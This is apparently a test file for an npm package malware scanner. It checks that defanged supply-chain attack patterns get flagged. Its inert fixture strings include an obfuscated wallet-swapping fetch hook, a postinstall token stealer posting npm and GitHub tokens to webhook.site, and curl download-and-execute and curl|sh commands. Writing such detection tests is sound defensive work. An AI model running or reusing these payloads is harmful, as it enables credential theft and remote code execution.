import { test } from 'node:test';
import assert from 'node:assert/strict';
import { analyzeNpmPackage } from '../src/analyze.js';
import { validateReport } from '../src/report/schema.js';
import { FIXED_NOW, makeScenario, manifest } from '../test-support/scenario.js';

// Defanged recreations of attack PATTERNS that public incident write-ups describe.
// They are not copies of any real package: every string here is inert text that
// the tests only scan, never run, import or install, and the hosts are
// placeholders. They answer one question: would the scanner notice this shape?
//
// What they do NOT show is detection of any specific real package or incident.

const SOURCE = { 'package.json': manifest(), 'src/index.js': 'module.exports = function add(a, b) { return a + b; };\n' };

async function analyze(packageFiles, { source = SOURCE } = {}) {
  const scenario = makeScenario({ packageFiles: { 'package.json': manifest(), ...packageFiles }, sourceFiles: source });
  const { report } = await analyzeNpmPackage({ name: 'demo-pkg', version: '1.0.0', fetchImpl: scenario.fetchImpl, now: FIXED_NOW });
  assert.deepEqual(validateReport(report), []);
  return report;
}

const rulesOf = (report) => report.findings.filter((f) => f.severity !== 'info').map((f) => f.ruleId);
const strongRules = (report) => new Set(report.findings.filter((f) => ['high', 'critical'].includes(f.severity)).map((f) => f.ruleId));

// ---- 1. Payload injected into a built bundle that hooks the browser's network
// functions and swaps cryptocurrency addresses (reported for npm packages in 2025).

const IDENTS = Array.from({ length: 14 }, (_, i) => `var _0x${(0x2a10 + i).toString(16)}=${i};`).join('');
// Obfuscator output is full of long hex-escaped strings.
const HEX_RUN = Array.from({ length: 20 }, () => '\\x68').join('');
const HEX_STRINGS = [1, 2, 3].map((n) => `var _0xaa${n}="${HEX_RUN}";`).join('');
const WALLET_SWAPPER = [
  `var _0x1f3a=['${HEX_RUN}','push','shift'];${IDENTS}${HEX_STRINGS}`,
  '(function(a,b){while(!![]){try{var c=parseInt(a[0]);if(c)break;else a["push"](a["shift"]());}catch(e){a["push"](a["shift"]());}}})(_0x1f3a,1);',
  `var ADDR=["0x${'1'.repeat(40)}","0x${'2'.repeat(40)}"];`,
  'var _orig=window.fetch;window.fetch=function(u,o){return _orig(u,o).then(function(r){return swap(r)})};',
  'XMLHttpRequest.prototype.send=function(b){return nativeSend.call(this,rewrite(b))};',
  'if(window.ethereum){window.ethereum.request({method:"eth_accounts"})}',
].join('\n');

test('incident shape: an obfuscated bundle that hooks the network near wallet code is suspicious', async () => {
  const report = await analyze({ 'dist/index.js': WALLET_SWAPPER });
  assert.deepEqual([...strongRules(report)].sort(), ['network-hook-wallet-swap', 'obfuscated-code']);
  assert.equal(report.summary.verdict, 'suspicious');
  assert.ok(report.summary.riskScore >= 60);
  const hook = report.findings.find((f) => f.ruleId === 'network-hook-wallet-swap');
  assert.equal(hook.confidence, 'high', 'hook + window.ethereum + addresses is a specific signature');
  assert.ok(hook.evidence.every((e) => e.path === 'dist/index.js' && e.line >= 1 && e.column >= 1));
});

test('incident shape: the same hook with no wallet code, obfuscation or install script is only reviewed', async () => {
  const report = await analyze({ 'dist/index.js': 'var _orig=window.fetch;window.fetch=function(u,o){return _orig(u,o)};' });
  assert.equal(report.summary.verdict, 'needs-review');
  assert.deepEqual(rulesOf(report), ['global-network-hook']);
  assert.ok(report.summary.riskScore < 15, 'a lone, low-confidence indicator stays below the review threshold on score alone');
});

// ---- 2. An install-time script that harvests tokens and posts them to a collector
// (the worm-style pattern reported for npm in 2025).

const TOKEN_STEALER = [
  'const https = require("https");',
  'const fs = require("fs");',
  'const os = require("os");',
  'const stolen = { npm: process.env.NPM_TOKEN, gh: process.env.GITHUB_TOKEN };',
  'try { stolen.rc = fs.readFileSync(os.homedir() + "/.npmrc", "utf8"); } catch (e) {}',
  'const req = https.request({ hostname: "webhook.site", path: "/00000000-0000-0000-0000-000000000000", method: "POST" });',
  'req.end(JSON.stringify(stolen));',
].join('\n');

test('incident shape: a new postinstall that runs a token-reading, data-sending file is suspicious', async () => {
  const report = await analyze({
    'package.json': manifest({ scripts: { postinstall: 'node bundle.js' } }),
    'bundle.js': TOKEN_STEALER,
  });
  const rules = new Set(rulesOf(report));
  for (const rule of ['install-script-added', 'install-script-runs-unsourced-file', 'install-script-runs-risky-file', 'credential-network-combination', 'sensitive-file-access', 'hardcoded-endpoint', 'sensitive-env-access']) {
    assert.ok(rules.has(rule), `${rule} missing from ${[...rules].join(', ')}`);
  }
  assert.equal(report.summary.verdict, 'suspicious');
  assert.ok(report.summary.riskScore >= 80, `score ${report.summary.riskScore}`);
  const combo = report.findings.find((f) => f.ruleId === 'credential-network-combination');
  assert.match(combo.description, /not proof that anything was sent/, 'it claims an attempt, never an exfiltration');
  for (const finding of report.findings) assert.doesNotMatch(`${finding.title} ${finding.description}`, /malicious|exfiltrated|stole/i);
});

test('incident shape: the same stealer with no install script is still a finding, but one rule is not "suspicious"', async () => {
  const report = await analyze({ 'bundle.js': TOKEN_STEALER });
  assert.ok(rulesOf(report).includes('credential-network-combination'));
  assert.ok(!rulesOf(report).some((rule) => rule.startsWith('install-script')));
  const strong = [...strongRules(report)];
  assert.deepEqual(strong, ['credential-network-combination']);
  assert.notEqual(report.summary.verdict, 'suspicious', 'a single strong rule needs corroboration');
  assert.equal(report.summary.verdict, 'needs-review');
});

// ---- 3. A preinstall script that downloads and runs a program (reported for npm
// packages hijacked to install miners and credential stealers).

test('incident shape: a new preinstall that runs a file which downloads and executes a binary is suspicious', async () => {
  const report = await analyze({
    'package.json': manifest({ scripts: { preinstall: 'node preinstall.js' } }),
    'preinstall.js': 'const cp = require("child_process");\ncp.exec("curl -s http://203.0.114.7/m -o /tmp/m && chmod +x /tmp/m && /tmp/m");',
  });
  const rules = new Set(rulesOf(report));
  for (const rule of ['install-script-added', 'install-script-runs-risky-file', 'process-execution', 'hardcoded-endpoint']) assert.ok(rules.has(rule), rule);
  assert.equal(report.summary.verdict, 'suspicious');
});

test('incident shape: an install script that downloads and pipes to a shell is flagged from the command alone', async () => {
  const report = await analyze({ 'package.json': manifest({ scripts: { postinstall: 'curl -s http://203.0.114.7/i.sh | sh' } }) });
  assert.ok(rulesOf(report).includes('install-script-fetches-code'));
  assert.equal(report.summary.verdict, 'suspicious', 'added script + a command that pipes a download to a shell');
});

// ---- 4. An encrypted blob decrypted and executed at runtime (reported in a 2018
// incident where a dependency decrypted code targeting one specific package).

test('incident shape: decrypting a blob and running it is high, and stands alone as needs-review', async () => {
  const code = [
    'const crypto = require("crypto");',
    'const key = pkg.description;',
    'const d = crypto.createDecipher("aes256", key);',
    'const source = d.update(BLOB, "hex", "utf8") + d.final("utf8");',
    'new Function(source)();',
  ].join('\n');
  const report = await analyze({ 'index.js': code });
  const finding = report.findings.find((f) => f.ruleId === 'decoded-code-execution');
  assert.equal(finding.severity, 'high');
  assert.equal(report.summary.verdict, 'needs-review');
});

// ---- 5. Many small signals that are each ordinary must NOT add up to an alarm.

test('ordinary signals together do not make a package suspicious', async () => {
  const report = await analyze({
    'lib/cli.js': [
      '#!/usr/bin/env node',
      'const { spawn } = require("child_process");',
      'const debug = process.env.DEBUG;',
      'const home = process.env.HOME;',
      'fetch("https://api.example.test/v1");',
      'spawn("git", ["status"]);',
    ].join('\n'),
    'lib/util.js': 'var root = Function("return this")(); module.exports = { root };',
  });
  assert.notEqual(report.summary.verdict, 'suspicious');
  assert.ok(report.summary.riskScore < 15);
  assert.deepEqual([...strongRules(report)], []);
});

// ---- 6. Honesty about limits: what the scanner does not see.

test('limit: code assembled from strings at runtime is not matched, which the report cannot hide', async () => {
  const evasive = 'const m = ["child", "process"].join("_"); const cp = require(m); cp["ex" + "ec"]("curl http://collector.test/p | sh");';
  const report = await analyze({ 'a.js': evasive });
  // The scanner has no finding here. That is a known limit of pattern matching, and
  // the report says so for every run: a low score is not a statement of safety.
  assert.deepEqual(rulesOf(report), []);
  assert.equal(report.scan.performed, true);
  assert.equal(report.summary.verdict, 'needs-review', 'the file still differs from the source');
});
